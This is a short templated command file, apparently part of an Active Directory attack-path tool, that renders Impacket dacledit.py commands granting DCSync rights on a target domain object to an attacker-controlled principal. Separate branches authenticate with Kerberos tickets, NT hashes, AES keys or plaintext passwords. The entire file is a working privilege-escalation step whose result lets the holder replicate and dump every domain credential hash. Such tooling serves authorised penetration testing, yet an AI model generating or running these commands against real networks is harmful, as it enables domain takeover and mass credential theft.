# Grant DCSync rights on {{target.name}} to {{parent.obj.name}}
{% if parent.krb_auth %}
dacledit.py '{{fqdn}}/{{parent.obj.name}}' -k -no-pass -use-ldaps -dc-ip {{dc_ip}} -principal-dn '{{parent.obj.dn}}' -target-dn '{{target.dn}}' -rights DCSync -action write
{%- elif parent.secret_type == T_SECRET_NTHASH %}
dacledit.py '{{fqdn}}/{{parent.obj.name}}' -hashes :{{parent.secret|red}} -use-ldaps -dc-ip {{dc_ip}} -principal-dn '{{parent.obj.dn}}' -target-dn '{{target.dn}}' -rights DCSync -action write
{%- elif parent.secret_type == T_SECRET_AESKEY %}
dacledit.py '{{fqdn}}/{{parent.obj.name}}' -k -no-pass -aesKey {{parent.secret|red}} -use-ldaps -dc-ip {{dc_ip}} -principal-dn '{{parent.obj.dn}}' -target-dn '{{target.dn}}' -rights DCSync -action write
{%- elif parent.secret_type == T_SECRET_PASSWORD %}
dacledit.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}' -use-ldaps -dc-ip {{dc_ip}} -principal-dn '{{parent.obj.dn}}' -target-dn '{{target.dn}}' -rights DCSync -action write
{%- endif %}
